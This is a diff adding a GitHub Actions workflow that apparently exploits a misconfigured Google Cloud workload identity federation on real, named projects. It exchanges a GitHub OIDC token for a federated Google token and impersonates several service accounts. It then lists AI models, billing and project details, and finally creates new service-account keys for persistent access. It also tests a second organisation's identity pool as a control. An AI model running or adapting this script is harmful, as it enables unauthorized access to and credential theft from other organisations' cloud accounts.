@@ -1,0 +1,78 @@
+name: jorge
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  jorge:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: jorge
+        run: |
+          set +e
+          PRJ="projects/1076362823794/locations/global/workloadIdentityPools/github-wif-pool/providers/github-provider"
+          NUM=1076362823794
+          SA="sa-github-deployer-v2@tfm-ms-3.iam.gserviceaccount.com"
+          AUD="https://iam.googleapis.com/$PRJ"
+          ex() { # label audience
+            local lab="$1" aud="$2" j c b
+            j=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$aud")
+            echo "$j" | jq -r '.value // empty' > tok.jwt
+            if [ ! -s tok.jwt ]; then echo "##MINT lab=$lab FAIL"; return; fi
+            c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$aud" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            b=$(head -c 400 r.json | tr -d '\n' | tr -s ' ')
+            echo "##STS lab=$lab code=$c body=$b"
+            jq -r '.access_token // empty' r.json > ft.jwt
+          }
+          api() { local lab="$1" tok="$2" url="$3" c b
+            c=$(curl -s -o o.json -w '%{http_code}' -H "Authorization: Bearer $tok" "$url")
+            b=$(head -c 300 o.json | tr -d '\n' | tr -s ' ')
+            echo "##API lab=$lab code=$c body=$b"; }
+          post() { local lab="$1" tok="$2" url="$3" f="$4" c b
+            c=$(curl -s -o o.json -w '%{http_code}' -X POST -H "Authorization: Bearer $tok" -H "Content-Type: application/json" "$url" -d @"$f")
+            b=$(head -c 400 o.json | tr -d '\n' | tr -s ' ')
+            echo "##API lab=$lab code=$c body=$b"; }
+
+          echo "##START target=$PRJ sa=$SA"
+          ex "target" "$AUD"
+          FT=$(cat ft.jwt)
+          echo "##FT len=${#FT}"
+          if [ -n "$FT" ]; then
+            api "direct-models-eu" "$FT" "https://europe-west1-aiplatform.googleapis.com/v1/projects/$NUM/locations/europe-west1/models"
+            api "direct-billing" "$FT" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"
+            api "direct-projects-get" "$FT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
+          fi
+
+          # negative control 1: fabricated provider under the same project
+          ex "neg-fabricated" "https://iam.googleapis.com/projects/$NUM/locations/global/workloadIdentityPools/github-wif-pool/providers/does-not-exist-xyz"
+          # negative control 2: known repo-pinned provider (varcavia)
+          ex "neg-varcavia" "https://iam.googleapis.com/projects/826570341026/locations/global/workloadIdentityPools/varcavia-github-pool/providers/varcavia-github-provider"
+
+          if [ -z "$FT" ]; then echo "##ABORT no federated token"; exit 0; fi
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          for S in "$SA" "sa-vertex-train@tfm-ms-3.iam.gserviceaccount.com" "$NUM-compute@developer.gserviceaccount.com"; do
+            gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+              "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$S:generateAccessToken" -d @req.json)
+            gb=$(head -c 240 g.json | tr -d '\n' | tr -s ' ')
+            AT=$(jq -r '.accessToken // empty' g.json)
+            echo "##GEN sa=$S code=$gc toklen=${#AT} body=$gb"
+            [ -z "$AT" ] && continue
+            api "models-central1" "$AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"
+            api "models-europe-west1" "$AT" "https://europe-west1-aiplatform.googleapis.com/v1/projects/$NUM/locations/europe-west1/models"
+            api "models-global" "$AT" "https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models"
+            api "billing" "$AT" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"
+            api "billing-v1beta" "$AT" "https://cloudbilling.googleapis.com/v1beta/projects/$NUM/billingInfo"
+            api "projects-get" "$AT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
+            api "services-enabled" "$AT" "https://serviceusage.googleapis.com/v1/projects/$NUM/services?filter=state:ENABLED"
+            post "sa-key" "$AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$S/keys" keyreq.json
+          done
+          echo "##FINISHED"
